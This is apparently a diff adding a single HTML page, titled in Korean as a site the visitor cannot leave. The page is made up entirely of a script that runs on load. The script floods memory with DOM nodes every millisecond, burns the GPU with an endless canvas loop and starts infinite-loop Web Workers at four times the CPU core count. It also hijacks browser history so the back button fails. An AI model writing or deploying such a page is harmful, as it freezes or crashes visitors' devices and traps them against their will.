@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>나갈 수 없는 사이트</title>
+  <style>
+    body { margin: 0; background: black; color: lime; font-size: 2rem; }
+  </style>
+</head>
+<body>
+  <h1>여긴 빠져나갈 수 없어...</h1>
+  <script>
+    function memoryOverload() {
+      setInterval(() => {
+        const div = document.createElement('div');
+        div.textContent = Math.random().toString().repeat(1000);
+        document.body.appendChild(div);
+      }, 1);
+    }
+
+    function gpuBurn() {
+      const canvas = document.createElement('canvas');
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+      document.body.appendChild(canvas);
+      const ctx = canvas.getContext('2d');
+      function draw() {
+        for (let i = 0; i < 10000; i++) {
+          ctx.fillStyle = `rgb(${Math.random()*255}, ${Math.random()*255}, ${Math.random()*255})`;
+          ctx.fillRect(Math.random()*canvas.width, Math.random()*canvas.height, 2, 2);
+        }
+        requestAnimationFrame(draw);
+      }
+      draw();
+    }
+
+    function cpuBurn() {
+      const blob = new Blob([`onmessage = function() { while(true) {} }`]);
+      const url = URL.createObjectURL(blob);
+      for (let i = 0; i < navigator.hardwareConcurrency * 4; i++) {
+        new Worker(url).postMessage('');
+      }
+    }
+
+    function preventBack() {
+      history.pushState(null, null, location.href);
+      window.onpopstate = () => {
+        history.pushState(null, null, location.href);
+      };
+    }
+
+    memoryOverload();
+    gpuBurn();
+    cpuBurn();
+    preventBack();
+  </script>
+</body>
+</html>
